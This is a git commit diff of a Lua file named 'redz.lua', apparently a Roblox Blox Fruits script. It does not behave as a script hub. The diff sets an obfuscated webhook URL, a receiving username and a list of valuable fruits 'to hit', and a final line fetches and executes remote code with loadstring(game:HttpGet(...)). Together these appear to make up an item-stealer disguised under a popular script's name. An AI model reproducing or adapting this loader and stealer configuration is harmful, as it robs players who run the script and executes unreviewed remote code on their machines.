86e5d2595ef4e63a3546f6763def960b45d14657
adamtalebi <talebi.adam1981@gmail.com>
2025-03-21 20:58:16 +0100

    Update redz.lua

--- redz.lua
+++ redz.lua
@@ -1,5 +1,5 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dXFmTkV2eEF5TVIyTi1jU2xDUHpzUTpNbldPUlBwLXAwNGlfb2NNOWt6Um5sRlMtX25WTFRjSEFnYUZLMkVGcmdnZThTS0FNMTJoNUc1dW94TEZvWGZ3QkQ2TDVhUjFIYzZkcVZ5OE1IcXVidXVoQk8yMWNFVGFTUkRzQmhrS2lya09BY2doNEhTVjJqanphQnF3UjFFN3VQNDQ1T2pXaVI1MGNZbHQ2UWpicGt0ZlkzdGhON0R4eEpmRWdvTGRpNkE" - << your webhook
-Usernames = {"olliir810", ""} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "dragon-dragon", "gravity-gravity", "pain-pain", "portal-portal", "buddha-buddha", "venom-venom", "spirit-spirit", "dough-dough", "mammoth-mammoth", "shadow-shadow"} -- << Fruits you want
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dWlua0VxbDBNemtwTGx6Mi1BV25FUTpBNi0xOXU4WlVvR2Z4Wk40X2JxQmhJWVdmWXp2cl9tMXc4WE9OWDJyVmgyNXZqVVRSNW1kOEduZU9xQUNuMlhmQTM0bTF1ZWtmajJ2OHZoTm1JblVicjhWNmtuZGlpTmJCZzlwQUViVGdWREUzVlpDaUtSQ1hpNmNUcXc5aHYyaVVpMjkzNVVORFdjNVJtV2ZieGJsaVlmZl90QUYxanVEb3I1dXhXdms4czQ"
+Usernames = {"adam345341"}
+FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
